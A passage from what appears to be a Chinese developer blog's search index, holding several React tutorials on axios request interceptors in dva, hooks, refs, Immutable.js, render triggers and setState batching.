&amp;&amp; status &lt; 422) &#123;        dispatch(routerRedux.push(&#x27;/exception/404&#x27;));      &#125;      // 开发时使用，上线时删除      console.log(`【$&#123;opt.method&#125; $&#123;opt.url&#125;】请求失败，响应数据：%o`, error.response);      return &#123; code: status, message: errortext &#125;;     &#125;);&#125;\n\n6.2 明确响应体\n以微信小程序为例，请求响应数据分为两部分：\n\n\n网络请求是否成功；\n业务场景值。即便网络请求成功了，业务处理上可能有时也会出错，比如校验不通过\n\n我们在拦截响应时要分别对这两部分进行处理\nresponse = &#123;  status: 200,                // 网络请求状态。  statusText: &#x27;xxx&#x27;,  data: &#123;    code: &#x27;1001&#x27;,             // 业务请求状态。这里 &#x27;0000&#x27; 表示业务没问题，其它都有问题    message: &#x27;yyy&#x27;,    data: &#123;  &#125;,  &#125;&#125;\n\n6.3 依赖包分析import axios from &#x27;axios&#x27;;import NProgress from &#x27;nprogress&#x27;;import &#123; notification, message &#125; from &#x27;antd&#x27;;import &#123; routerRedux &#125; from &#x27;dva/router&#x27;;import store from &#x27;../index&#x27;;\n\n\nimport store from &#39;../index&#39;;这是 dva 中导出的对象。即下面代码最终导出的 app._store，引入它是因为 dispatch 对象在里面，我们需要 dispatch 对象进行路由跳转\n\n// index.jsimport dva from &#x27;dva&#x27;;import &#123; message &#125; from &#x27;antd&#x27;;import &#123; createBrowserHistory as createHistory &#125; from &#x27;history&#x27;;// 1. Initializeconst app = dva(&#123;  history: createHistory(),&#125;);// 2. Pluginsapp.use(createLoading());// 3. Modelapp.model(require(&#x27;./models/app/global&#x27;).default);// 4. Routerapp.router(require(&#x27;./router&#x27;).default);// 5. Startapp.start(&#x27;#root&#x27;);export default app._store;\n\n6.4 axios 全局配置// 设置全局参数，如响应超市时间，请求前缀等。axios.defaults.timeout = 5000axios.defaults.baseURL = &#x27;/api/v1&#x27;;axios.defaults.withCredentials = true;\n\n\naxios 可以设置很多全局配置，具体可参阅 https://segmentfault.com/a/1190000008470355\n\n6.5 加载 NProgress 过渡组件/ 添加一个请求拦截器，用于设置请求过渡状态axios.interceptors.request.use((config) =&gt; &#123;  // 请求开始，蓝色过渡滚动条开始出现  NProgress.start();  return config;&#125;, (error) =&gt; &#123;  return Promise.reject(error);&#125;);// 添加一个返回拦截器axios.interceptors.response.use((response) =&gt; &#123;  // 请求结束，蓝色过渡滚动条消失  NProgress.done();  return response;&#125;, (error) =&gt; &#123;  // 请求结束，蓝色过渡滚动条消失  // 即使出现异常，也要调用关闭方法，否则一直处于加载状态很奇怪  NProgress.done();  return Promise.reject(error);&#125;);\n\n\nNProgress 的使用主要有两个方法，当调用 NProgress.start(); 时在浏览器顶部就会出现蓝色小条，当调用 NProgress.done(); 蓝色小条就会消失。我们分别在请求开始和接收到响应调用这两个方法\n\n\n6.6 网络请求成功处理.then((response) =&gt;       // &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; 请求成功 &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;      console.log(`【$&#123;opt.method&#125; $&#123;opt.url&#125;】请求成功，响应数据：%o`, response);      // 打印业务错误提示      if (response.data &amp;&amp; response.data.code != &#x27;0000&#x27;) &#123;        message.error(response.data.message);      &#125;      return &#123; ...response.data &#125;;    &#125;)\n\n\n网络请求状态码为 200-300 表示成功，此时还应该判断业务处理是否成功。这个根据具体项目具体规定，比如微信小程序有一套场景值。在实际项目中可以自行规定 code = &#39;0000&#39; 业务处理完全没问题，code = &#39;1111&#39;校验不通过，code = &#39;2222&#39; 数据库出错等等。\n\n\n最后别忘了要返回具体对象 &#123; ...response.data &#125;\n\n6.7 网络请求失败处理// 状态码错误信息const codeMessage = &#123;  200: &#x27;服务器成功返回请求的数据。&#x27;,  201: &#x27;新建或修改数据成功。&#x27;,  202: &#x27;一个请求已经进入后台排队（异步任务）。&#x27;,  204: &#x27;删除数据成功。&#x27;,  400: &#x27;发出的请求有错误，服务器没有进行新建或修改数据的操作。&#x27;,  401: &#x27;用户没有权限（令牌、用户名、密码错误）。&#x27;,  403: &#x27;用户得到授权，但是访问是被禁止的。&#x27;,  404: &#x27;发出的请求针对的是不存在的记录，服务器没有进行操作。&#x27;,  406: &#x27;请求的格式不可得。&#x27;,  410: &#x27;请求的资源被永久删除，且不会再得到的。&#x27;,  422: &#x27;当创建一个对象时，发生一个验证错误。&#x27;,  500: &#x27;服务器发生错误，请检查服务器。&#x27;,  502: &#x27;网关错误。&#x27;,  503: &#x27;服务不可用，服务器暂时过载或维护。&#x27;,  504: &#x27;网关超时。&#x27;,&#125;;// ............catch((error) =&gt; &#123;      // &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; 请求失败 &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;      // 请求配置发生的错误      if (!error.response) &#123;        return console.log(&#x27;Error&#x27;, error.message);      &#125;      // 响应时状态码处理       const status = error.response.status;      const errortext = codeMessage[status] || error.response.statusText;            notification.error(&#123;        message: `请求错误 $&#123;status&#125;`,        description: errortext,      &#125;);            // 存在请求，但是服务器的返回一个状态码，它们都在2xx之外      const &#123; dispatch &#125; = store;      if (status === 401) &#123;        dispatch(routerRedux.push(&#x27;/user/login&#x27;));      &#125; else if (status === 403) &#123;        dispatch(routerRedux.push(&#x27;/exception/403&#x27;));      &#125; else if (status &lt;= 504 &amp;&amp; status &gt;= 500) &#123;        dispatch(routerRedux.push(&#x27;/exception/500&#x27;));      &#125; else if (status &gt;= 404 &amp;&amp; status &lt; 422) &#123;        dispatch(routerRedux.push(&#x27;/exception/404&#x27;));      &#125;      // 开发时使用，上线时删除      console.log(`【$&#123;opt.method&#125; $&#123;opt.url&#125;】请求失败，响应数据：%o`, error.response);      return &#123; code: status, message: errortext &#125;;     &#125;);\n\n\n网络请求失败，首先需要根据 status 打印提示消息，告诉用户为什么请求失败。如响应码为 401，那么提示用户的文字就会是 用户没有权限（令牌、用户名、密码错误）\n如果是 401 错误，表示用户没有权限访问或者用户名密码输入错误，应该跳转到登录页面：dispatch(routerRedux.push(&#39;/user/login&#39;));\n\n七、更多参考\ndva官方教程\n官方文档\n使用Dva的所有知识点\nDva-React 应用框架在蚂蚁金服的实践\nroadhog介绍\n创建一个 dva 脚手架工程\ndva 脚手架目录分析\n12 步 30 分钟，完成用户管理的 CURD 应用 (react+dva+antd)\ndva router4.0 使用实践总结\ndva 2.0中如何使用代码进行路由跳转\ndva 配置 browserHistory 实践总结\ndva-loading 实践用法\ndva 升级2.0版本遇到的问题小结\ndva 中进行页面复用实践总结\nDva知识地图\ndva-API文档\n\n","categories":["框架"],"tags":["React"]},{"title":"React hooks","url":"/2020/01/15/React/React-hooks/","content":"一、组件类的缺点\nReact 的核心是组件。v16.8版本之前，组件的标准写法是类（class）。下面是一个简单的组件类\n\nimport React, &#123; Component &#125; from &quot;react&quot;;export default class Button extends Component &#123;  constructor() &#123;    super();    this.state = &#123; buttonText: &quot;Click me, please&quot; &#125;;    this.handleClick = this.handleClick.bind(this);  &#125;  handleClick() &#123;    this.setState(() =&gt; &#123;      return &#123; buttonText: &quot;Thanks, been clicked!&quot; &#125;;    &#125;);  &#125;  render() &#123;    const &#123; buttonText &#125; = this.state;    return &lt;button onClick=&#123;this.handleClick&#125;&gt;&#123;buttonText&#125;&lt;/button&gt;;  &#125;&#125;\n\n这个组件类仅仅是一个按钮，但可以看到，它的代码已经很”重”了。真实的 React App 由多个类按照层级，一层层构成，复杂度成倍增长。再加入 Redux，就变得更复杂\nHook 是 React 16.8 的新增特性。它可以让你在不编写 class 的情况下使用 state 以及其他的 React 特性\n至于为什么引入hook，官方给出的动机是解决长时间使用和维护react过程中常遇到的问题，例如：\n\n难以重用和共享组件中的与状态相关的逻辑\n逻辑复杂的组件难以开发与维护，当我们的组件需要处理多个互不相关的 local state 时，每个生命周期函数中可能会包含着各种互不相关的逻辑在里面\n类组件中的this增加学习成本，类组件在基于现有工具的优化上存在些许问题\n由于业务变动，函数组件不得不改为类组件等等\n\n在以前，函数组件也被称为无状态的组件，只负责渲染的一些工作\n因此，现在的函数组件也可以是有状态的组件，内部也可以维护自身的状态以及做一些逻辑方面的处理\n二、Hook 的含义\nReact Hooks 的意思是，组件尽量写成纯函数，如果需要外部功能和副作用，就用钩子把外部代码”钩”进来。 React Hooks 就是那些钩子。\n你需要什么功能，就使用什么钩子。React 默认提供了一些常用钩子，你也可以封装自己的钩子。\n所有的钩子都是为函数引入外部功能，所以 React 约定，钩子一律使用use前缀命名，便于识别。你要使用 xxx 功能，钩子就命名为 usexxx\n\nReact 默认提供的四个最常用的钩子\n\nuseState()\nuseContext()\nuseReducer()\nuseEffect()\nuseCallback\nuseMemo\n\n三、useState()：状态钩子\nuseState()用于为函数组件引入状态（state）。纯函数不能有状态，所以把状态放在钩子里面。\n\n用户点击按钮，会导致按钮的文字改变，文字取决于用户是否点击，这就是状态。使用useState()重写如下\nimport React, &#123; useState &#125; from &quot;react&quot;;export default function  Button()  &#123;  const  [buttonText, setButtonText] =  useState(&quot;Click me,   please&quot;);  function handleClick()  &#123;    return setButtonText(&quot;Thanks, been clicked!&quot;);  &#125;  return  &lt;button  onClick=&#123;handleClick&#125;&gt;&#123;buttonText&#125;&lt;/button&gt;;&#125;\n\n上面代码中，Button 组件是一个函数，内部使用useState()钩子引入状态。\n\nuseState()这个函数接受状态的初始值，作为参数，上例的初始值为按钮的文字。该函数返回一个数组，数组的第一个成员是一个变量（上例是buttonText），指向状态的当前值。第二个成员是一个函数，用来更新状态，约定是set前缀加上状态的变量名（上例是setButtonText）\n\n四、useContext()：共享状态钩子\n如果需要在组件之间共享状态，可以使用·useContext()·。\n现在有两个组件 ·Navbar ·和 ·Messages·，我们希望它们之间共享状态\n\n&lt;div className=&quot;App&quot;&gt;  &lt;Navbar/&gt;  &lt;Messages/&gt;&lt;/div&gt;\n\n\n第一步就是使用 React Context API，在组件外部建立一个 Context。\n\nconst AppContext = React.createContext(&#123;&#125;);\n\n组件封装代码如下。\n&lt;AppContext.Provider value=&#123;&#123;  username: &#x27;superawesome&#x27;&#125;&#125;&gt;  &lt;div className=&quot;App&quot;&gt;    &lt;Navbar/&gt;    &lt;Messages/&gt;  &lt;/div&gt;&lt;/AppContext.Provider&gt;\n\n\n上面代码中，AppContext.Provider提供了一个 Context 对象，这个对象可以被子组件共享。\n\nNavbar 组件的代码如下。\nconst Navbar = () =&gt; &#123;  const &#123; username &#125; = useContext(AppContext);  return (    &lt;div className=&quot;navbar&quot;&gt;      &lt;p&gt;AwesomeSite&lt;/p&gt;      &lt;p&gt;&#123;username&#125;&lt;/p&gt;    &lt;/div&gt;  );&#125;\n\n\n上面代码中，useContext()钩子函数用来引入Context 对象，从中获取username属性。\n\nMessage 组件的代码也类似。\nconst Messages = () =&gt; &#123;  const &#123; username &#125; = useContext(AppContext)  return (    &lt;div className=&quot;messages&quot;&gt;      &lt;h1&gt;Messages&lt;/h1&gt;      &lt;p&gt;1 message for &#123;username&#125;&lt;/p&gt;      &lt;p className=&quot;message&quot;&gt;useContext is awesome!&lt;/p&gt;    &lt;/div&gt;  )&#125;\n\n五、useReducer()：action 钩子\nReact 本身不提供状态管理功能，通常需要使用外部库。这方面最常用的库是 Redux。\nRedux 的核心概念是，组件发出 action 与状态管理器通信。状态管理器收到 action以后，使用 Reducer函数算出新的状态，Reducer 函数的形式是(state, action) =&gt; newState。\nuseReducers()钩子用来引入 Reducer 功能。\n\nconst [state, dispatch] = useReducer(reducer, initialState);\n\n\n上面是useReducer()的基本用法，它接受Reducer 函数和状态的初始值作为参数，返回一个数组。数组的第一个成员是状态的当前值，第二个成员是发送 action 的dispatch函数。\n\n下面是一个计数器的例子。用于计算状态的 Reducer 函数如下。\nconst myReducer = (state, action) =&gt; &#123;  switch(action.type)  &#123;    case(&#x27;countUp&#x27;):      return  &#123;        ...state,        count: state.count + 1      &#125;    default:      return  state;  &#125;&#125;function App() &#123;  const [state, dispatch] = useReducer(myReducer, &#123; count:   0 &#125;);  return  (    &lt;div className=&quot;App&quot;&gt;      &lt;button onClick=&#123;() =&gt; dispatch(&#123; type: &#x27;countUp&#x27; &#125;)&#125;&gt;        +1      &lt;/button&gt;      &lt;p&gt;Count: &#123;state.count&#125;&lt;/p&gt;    &lt;/div&gt;  );&#125;\n\n\n由于 Hooks 可以提供共享状态和 Reducer 函数，所以它在这些方面可以取代 Redux。但是，它没法提供中间件（middleware）和时间旅行（time travel），如果你需要这两个功能，还是要用 Redux\n\n六、useEffect()：副作用钩子\nuseEffect()用来引入具有副作用的操作，最常见的就是向服务器请求数据。以前，放在componentDidMount里面的代码，现在可以放在useEffect()。\n\nuseEffect()的用法如下。\nuseEffect(()  =&gt;  &#123;  // Async Action&#125;, [dependencies])\n\n\n上面用法中，useEffect()接受两个参数。第一个参数是一个函数，异步操作的代码放在里面。第二个参数是一个数组，用于给出 Effect 的依赖项，只要这个数组发生变化，useEffect()就会执行。第二个参数可以省略，这时每次组件渲染时，就会执行useEffect()。\n\nconst Person = (&#123; personId &#125;) =&gt; &#123;  const [loading, setLoading] = useState(true);  const [person, setPerson] = useState(&#123;&#125;);  useEffect(() =&gt; &#123;    setLoading(true);     fetch(`https://swapi.co/api/people/$&#123;personId&#125;/`)      .then(response =&gt; response.json())      .then(data =&gt; &#123;        setPerson(data);        setLoading(false);      &#125;);  &#125;, [personId])  if (loading === true) &#123;    return &lt;p&gt;Loading ...&lt;/p&gt;  &#125;  return &lt;div&gt;    &lt;p&gt;You&#x27;re viewing: &#123;person.name&#125;&lt;/p&gt;    &lt;p&gt;Height: &#123;person.height&#125;&lt;/p&gt;    &lt;p&gt;Mass: &#123;person.mass&#125;&lt;/p&gt;  &lt;/div&gt;&#125;\n\n\n上面代码中，每当组件参数personId发生变化，useEffect()就会执行。组件第一次渲染时，useEffect()也会执行\n\n七、解决什么通过对上面的初步认识，可以看到hooks能够更容易解决状态相关的重用的问题：\n\n每调用useHook一次都会生成一份独立的状态\n通过自定义hook能够更好的封装我们的功能\n\n编写hooks为函数式编程，每个功能都包裹在函数中，整体风格更清爽，更优雅\nhooks`的出现，使函数组件的功能得到了扩充，拥有了类组件相似的功能，在我们日常使用中，使用`hooks`能够解决大多数问题，并且还拥有代码复用机制，因此优先考虑`hooks","categories":["框架"],"tags":["React"]},{"title":"React-refs","url":"/2020/02/23/React/React-refs/","content":"一、是什么Refs 在计算机中称为弹性文件系统（英语：Resilient File System，简称ReFS）\nReact 中的 Refs提供了一种方式，允许我们访问 DOM节点或在 render方法中创建的 React元素\n本质为ReactDOM.render()返回的组件实例，如果是渲染组件则返回的是组件实例，如果渲染dom则返回的是具体的dom节点\n二、如何使用创建ref的形式有三种：\n\n传入字符串，使用时通过 this.refs.传入的字符串的格式获取对应的元素\n传入对象，对象是通过 React.createRef() 方式创建出来，使用时获取到创建的对象中存在 current 属性就是对应的元素\n传入函数，该函数会在 DOM 被挂载时进行回调，这个函数会传入一个 元素对象，可以自己保存，使用时，直接拿到之前保存的元素对象即可\n传入hook，hook是通过 useRef() 方式创建，使用时通过生成hook对象的 current 属性就是对应的元素\n\n传入字符串只需要在对应元素或组件中ref属性\nclass MyComponent extends React.Component &#123;  constructor(props) &#123;    super(props);    this.myRef = React.createRef();  &#125;  render() &#123;    return &lt;div ref=&quot;myref&quot; /&gt;;  &#125;&#125;\n\n访问当前节点的方式如下：\nthis.refs.myref.innerHTML = &quot;hello&quot;;\n\n传入对象refs通过React.createRef()创建，然后将ref属性添加到React元素中，如下：\nclass MyComponent extends React.Component &#123;  constructor(props) &#123;    super(props);    this.myRef = React.createRef();  &#125;  render() &#123;    return &lt;div ref=&#123;this.myRef&#125; /&gt;;  &#125;&#125;\n\n当 ref 被传递给 render 中的元素时，对该节点的引用可以在 ref 的 current 属性中访问\nconst node = this.myRef.current;\n\n传入函数当ref传入为一个函数的时候，在渲染过程中，回调函数参数会传入一个元素对象，然后通过实例将对象进行保存\nclass MyComponent extends React.Component &#123;  constructor(props) &#123;    super(props);    this.myRef = React.createRef();  &#125;  render() &#123;    return &lt;div ref=&#123;element =&gt; this.myref = element&#125; /&gt;;  &#125;&#125;\n\n获取ref对象只需要通过先前存储的对象即可\nconst node = this.myref \n\n传入hook通过useRef创建一个ref，整体使用方式与React.createRef一致\nfunction App(props) &#123;  const myref = useRef()  return (    &lt;&gt;      &lt;div ref=&#123;myref&#125;&gt;&lt;/div&gt;    &lt;/&gt;  )&#125;\n\n获取ref属性也是通过hook对象的current属性\nconst node = myref.current;\n\n上述三种情况都是ref属性用于原生HTML元素上，如果ref设置的组件为一个类组件的时候，ref对象接收到的是组件的挂载实例\n注意的是，不能在函数组件上使用ref属性，因为他们并没有实例\n三、应用场景在某些情况下，我们会通过使用refs来更新组件，但这种方式并不推荐，更多情况我们是通过props与state的方式进行去重新渲染子元素\n过多使用refs，会使组件的实例或者是DOM结构暴露，违反组件封装的原则\n例如，避免在 Dialog 组件里暴露 open() 和 close() 方法，最好传递 isOpen 属性\n但下面的场景使用refs非常有用：\n\n对Dom元素的焦点控制、内容选择、控制\n对Dom元素的内容设置及媒体播放\n对Dom元素的操作和对组件实例的操作\n集成第三方 DOM 库\n\n","categories":["原理","React"],"tags":["React"]},{"title":"React-immutable DOM 和 Virtual DOM 的区别","url":"/2020/01/21/React/React-immutable/","content":"一、是什么Immutable，不可改变的，在计算机中，即指一旦创建，就不能再被更改的数据\n对 Immutable对象的任何修改或添加删除操作都会返回一个新的 Immutable对象\nImmutable 实现的原理是 Persistent Data Structure（持久化数据结构）:\n\n用一种数据结构来保存数据\n当数据被修改时，会返回一个对象，但是新的对象会尽可能的利用之前的数据结构而不会对内存造成浪费\n\n也就是使用旧数据创建新数据时，要保证旧数据同时可用且不变，同时为了避免 deepCopy把所有节点都复制一遍带来的性能损耗，Immutable 使用了 Structural Sharing（结构共享）\n如果对象树中一个节点发生变化，只修改这个节点和受它影响的父节点，其它节点则进行共享\n如下图所示：\n\n二、如何使用使用Immutable对象最主要的库是immutable.js\nimmutable.js 是一个完全独立的库，无论基于什么框架都可以用它\n其出现场景在于弥补 Javascript 没有不可变数据结构的问题，通过 structural sharing来解决的性能问题\n内部提供了一套完整的 Persistent Data Structure，还有很多易用的数据类型，如Collection、List、Map、Set、Record、Seq，其中：\n\nList: 有序索引集，类似 JavaScript 中的 Array\nMap: 无序索引集，类似 JavaScript 中的 Object\nSet: 没有重复值的集合\n\n主要的方法如下：\n\nfromJS()：将一个js数据转换为Immutable类型的数据\n\nconst obj = Immutable.fromJS(&#123;a:&#x27;123&#x27;,b:&#x27;234&#x27;&#125;)\n\n\ntoJS()：将一个Immutable数据转换为JS类型的数据\nis()：对两个对象进行比较\n\nimport &#123; Map, is &#125; from &#x27;immutable&#x27;const map1 = Map(&#123; a: 1, b: 1, c: 1 &#125;)const map2 = Map(&#123; a: 1, b: 1, c: 1 &#125;)map1 === map2   //falseObject.is(map1, map2) // falseis(map1, map2) // true\n\n\nget(key)：对数据或对象取值\ngetIn([]) ：对嵌套对象或数组取值，传参为数组，表示位置\n\nlet abs = Immutable.fromJS(&#123;a: &#123;b:2&#125;&#125;);abs.getIn([&#x27;a&#x27;, &#x27;b&#x27;]) // 2abs.getIn([&#x27;a&#x27;, &#x27;c&#x27;]) // 子级没有值let arr = Immutable.fromJS([1 ,2, 3, &#123;a: 5&#125;]);arr.getIn([3, &#x27;a&#x27;]); // 5arr.getIn([3, &#x27;c&#x27;]); // 子级没有值\n\n如下例子：使用方法如下：\nimport Immutable from &#x27;immutable&#x27;;foo = Immutable.fromJS(&#123;a: &#123;b: 1&#125;&#125;);bar = foo.setIn([&#x27;a&#x27;, &#x27;b&#x27;], 2);   // 使用 setIn 赋值console.log(foo.getIn([&#x27;a&#x27;, &#x27;b&#x27;]));  // 使用 getIn 取值，打印 1console.log(foo === bar);  //  打印 false\n\n如果换到原生的js，则对应如下：\nlet foo = &#123;a: &#123;b: 1&#125;&#125;;let bar = foo;bar.a.b = 2;console.log(foo.a.b);  // 打印 2console.log(foo === bar);  //  打印 true\n\n三、在React中应用使用 Immutable可以给 React 应用带来性能的优化，主要体现在减少渲染的次数\n在做react性能优化的时候，为了避免重复渲染，我们会在shouldComponentUpdate()中做对比，当返回true执行render方法\nImmutable通过is方法则可以完成对比，而无需像一样通过深度比较的方式比较\n在使用redux过程中也可以结合Immutable，不使用Immutable前修改一个数据需要做一个深拷贝\nimport &#x27;_&#x27; from &#x27;lodash&#x27;;const Component = React.createClass(&#123;  getInitialState() &#123;    return &#123;      data: &#123; times: 0 &#125;    &#125;  &#125;,  handleAdd() &#123;    let data = _.cloneDeep(this.state.data);    data.times = data.times + 1;    this.setState(&#123; data: data &#125;);  &#125;&#125;\n\n使用 Immutable 后：\ngetInitialState() &#123;  return &#123;    data: Map(&#123; times: 0 &#125;)  &#125;&#125;,  handleAdd() &#123;    this.setState(&#123; data: this.state.data.update(&#x27;times&#x27;, v =&gt; v + 1) &#125;);    // 这时的 times 并不会改变    console.log(this.state.data.get(&#x27;times&#x27;));  &#125;\n\n同理，在redux中也可以将数据进行fromJS处理\nimport * as constants from &#x27;./constants&#x27;import &#123;fromJS&#125; from &#x27;immutable&#x27;const defaultState = fromJS(&#123; //将数据转化成immutable数据    home:true,    focused:false,    mouseIn:false,    list:[],    page:1,    totalPage:1&#125;)export default(state=defaultState,action)=&gt;&#123;    switch(action.type)&#123;        case constants.SEARCH_FOCUS:            return state.set(&#x27;focused&#x27;,true) //更改immutable数据        case constants.CHANGE_HOME_ACTIVE:            return state.set(&#x27;home&#x27;,action.value)        case constants.SEARCH_BLUR:            return state.set(&#x27;focused&#x27;,false)        case constants.CHANGE_LIST:            // return state.set(&#x27;list&#x27;,action.data).set(&#x27;totalPage&#x27;,action.totalPage)            //merge效率更高，执行一次改变多个数据            return state.merge(&#123;                list:action.data,                totalPage:action.totalPage            &#125;)        case constants.MOUSE_ENTER:            return state.set(&#x27;mouseIn&#x27;,true)        case constants.MOUSE_LEAVE:            return state.set(&#x27;mouseIn&#x27;,false)        case constants.CHANGE_PAGE:            return state.set(&#x27;page&#x27;,action.page)        default:            return state    &#125;&#125;","categories":["React"],"tags":["React"]},{"title":"React-render","url":"/2020/02/26/React/React-render%E7%9A%84%E5%8E%9F%E7%90%86/","content":"一、原理首先，render函数在react中有两种形式：\n在类组件中，指的是render方法：\nclass Foo extends React.Component &#123;    render() &#123;        return &lt;h1&gt; Foo &lt;/h1&gt;;    &#125;&#125;\n\n在函数组件中，指的是函数组件本身：\nfunction Foo() &#123;    return &lt;h1&gt; Foo &lt;/h1&gt;;&#125;\n\n在render中，我们会编写jsx，jsx通过babel编译后就会转化成我们熟悉的js格式，如下：\nreturn (  &lt;div className=&#x27;cn&#x27;&gt;    &lt;Header&gt; hello &lt;/Header&gt;    &lt;div&gt; start &lt;/div&gt;    Right Reserve  &lt;/div&gt;)\n\nbabel编译后：\nreturn (  React.createElement(    &#x27;div&#x27;,    &#123;      className : &#x27;cn&#x27;    &#125;,    React.createElement(      Header,      null,      &#x27;hello&#x27;    ),    React.createElement(      &#x27;div&#x27;,      null,      &#x27;start&#x27;    ),    &#x27;Right Reserve&#x27;  ))\n\n从名字上来看，createElement方法用来元素的\n在react中，这个元素就是虚拟DOM树的节点，接收三个参数：\n\ntype：标签\nattributes：标签属性，若无则为null\nchildren：标签的子节点\n\n这些虚拟DOM树最终会渲染成真实DOM\n在render过程中，React 将新调用的 render函数返回的树与旧版本的树进行比较，这一步是决定如何更新 DOM 的必要步骤，然后进行 diff 比较，更新 DOM树\n二、触发时机render的执行时机主要分成了两部分：\n\n类组件调用 setState 修改状态\n\nclass Foo extends React.Component &#123;  state = &#123; count: 0 &#125;;  increment = () =&gt; &#123;    const &#123; count &#125; = this.state;    const newCount = count &lt; 10 ? count + 1 : count;    this.setState(&#123; count: newCount &#125;);  &#125;;  render() &#123;    const &#123; count &#125; = this.state;    console.log(&quot;Foo render&quot;);    return (      &lt;div&gt;        &lt;h1&gt; &#123;count&#125; &lt;/h1&gt;        &lt;button onClick=&#123;this.increment&#125;&gt;Increment&lt;/button&gt;      &lt;/div&gt;    );  &#125;&#125;\n\n点击按钮，则调用setState方法，无论count发生变化辩护，控制台都会输出Foo render，证明render执行了\n\n函数组件通过useState hook修改状态\n\nfunction Foo() &#123;  const [count, setCount] = useState(0);  function increment() &#123;    const newCount = count &lt; 10 ? count + 1 : count;    setCount(newCount);  &#125;  console.log(&quot;Foo render&quot;);    return (    &lt;div&gt;      &lt;h1&gt; &#123;count&#125; &lt;/h1&gt;      &lt;button onClick=&#123;increment&#125;&gt;Increment&lt;/button&gt;    &lt;/div&gt;  );&#125;\n\n函数组件通过useState这种形式更新数据，当数组的值不发生改变了，就不会触发render\n\n类组件重新渲染\n\nclass App extends React.Component &#123;  state = &#123; name: &quot;App&quot; &#125;;  render() &#123;    return (      &lt;div className=&quot;App&quot;&gt;        &lt;Foo /&gt;        &lt;button onClick=&#123;() =&gt; this.setState(&#123; name: &quot;App&quot; &#125;)&#125;&gt;          Change name        &lt;/button&gt;      &lt;/div&gt;    );  &#125;&#125;function Foo() &#123;  console.log(&quot;Foo render&quot;);  return (    &lt;div&gt;      &lt;h1&gt; Foo &lt;/h1&gt;    &lt;/div&gt;  );&#125;\n\n只要点击了 App 组件内的 Change name 按钮，不管 Foo 具体实现是什么，都会被重新render渲染\n\n函数组件重新渲染\n\nfunction App()&#123;    const [name,setName] = useState(&#x27;App&#x27;)    return (        &lt;div className=&quot;App&quot;&gt;            &lt;Foo /&gt;            &lt;button onClick=&#123;() =&gt; setName(&quot;aaa&quot;)&#125;&gt;                &#123; name &#125;            &lt;/button&gt;      &lt;/div&gt;    )&#125;function Foo() &#123;  console.log(&quot;Foo render&quot;);  return (    &lt;div&gt;      &lt;h1&gt; Foo &lt;/h1&gt;    &lt;/div&gt;  );&#125;\n\n可以发现，使用useState来更新状态的时候，只有首次会触发Foo render，后面并不会导致Foo render\n三、总结render`函数里面可以编写`JSX`，转化成`createElement`这种形式，用于生成虚拟`DOM`，最终转化成真实`DOM\n\n在React 中，类组件只要执行了 setState 方法，就一定会触发 render 函数执行，函数组件使用useState更改状态不一定导致重新render\n组件的props 改变了，不一定触发 render 函数的执行，但是如果 props 的值来自于父组件或者祖先组件的 state\n在这种情况下，父组件或者祖先组件的 state 发生了改变，就会导致子组件的重新渲染\n所以，一旦执行了setState就会执行render方法，useState 会判断当前值有无发生改变确定是否执行render方法，一旦父组件发生渲染，子组件也会渲染\n\n","categories":["框架"],"tags":["React"]},{"title":"React-setState原理","url":"/2020/03/06/React/React-setstate%E5%8E%9F%E7%90%86/","content":"一、setState异步更新\n我们都知道，React通过this.state来访问state，通过this.setState()方法来更新state。当this.setState()方法被调用的时候，React会重新调用render方法来重新渲染UI\n\n首先如果直接在setState后面获取state的值是获取不到的。在React内部机制能检测到的地方， setState就是异步的；在React检测不到的地方，例如setInterval,setTimeout，setState就是同步更新的\n\n其实 React 中setState本身执行的过程和代码是同步的，只是因为 React 框架本身的性能优化机制而导致的。React 中合成事件和生命周期函数的调用顺序在更新之前，导致在合成事件和生命周期函数中无法立刻得到更新后的值，形成了异步的形式。\n\n假如在一个合成事件中，循环调用了setState方法n次，如果 React 没有优化，当前组件就要被渲染n次，这对性能来说是很大的浪费。所以，React 为了性能原因，对调用多次setState方法合并为一个来执行。当执行setState的时候，state中的数据并不会马上更新。\n\n前面已经说到，在 React 的合成事件和生命周期函数中直接调用setState，会表现出异步的形式。\n\n除此之外，如果越过 React 的性能优化机制，在原生事件、setTimeout中使用setState，就会表现出同步的形式。\n\n\n\n\n因为setState是可以接受两个参数的，一个state，一个回调函数。因此我们可以在回调函数里面获取值\n\n\n\nsetState方法通过一个队列机制实现state更新，当执行setState的时候，会将需要更新的state合并之后放入状态队列，而不会立即更新this.state\n\n如果我们不使用setState而是使用this.state.key来修改，将不会触发组件的re-render。\n\n如果将this.state赋值给一个新的对象引用，那么其他不在对象上的state将不会被放入状态队列中，当下次调用setState并对状态队列进行合并时，直接造成了state丢失\n\n\n异步：react合成事件 声明周期函数在 React 中直接使用的事件，如onChange、onClick等，都是由 React 封装后的事件，是合成事件，由 React 管理。那么由于性能优化的机制，在合成事件中直接调用setState，将表现出异步的形式。\n生命周期函数也是由 React 所管理，在生命周期函数中直接调用setState，也会表现出异步的形式。\n同步：原生事件setTimeoutsetState本身执行的过程是同步的，使用原生事件，绕过 React 的管理，将表现出同步的形式。\n在生命周期componentDidMount函数中写了一个定时器setTimeout，在setTimeout内部将state中的count加1，并在此之后打印count的值，结果会打印最新的count值1。\nsetState虽然也是写在生命周期componentDidMount函数中的，但并不是直接写在componentDidMount里，而是套了一层setTimeout。这样，setState就表现出同步的形式。\n1.1 setState批量更新的过程\n在react生命周期和合成事件执行前后都有相应的钩子，分别是pre钩子和post钩子，pre钩子会调用batchedUpdate方法将isBatchingUpdates变量置为true，开启批量更新，而post钩子会将isBatchingUpdates置为false\n\n\n\nisBatchingUpdates变量置为true，则会走批量更新分支，setState的更新会被存入队列中，待同步代码执行完后，再执行队列中的state更新。 isBatchingUpdates为 true，则把当前组件（即调用了 setState的组件）放入 dirtyComponents 数组中；否则 batchUpdate 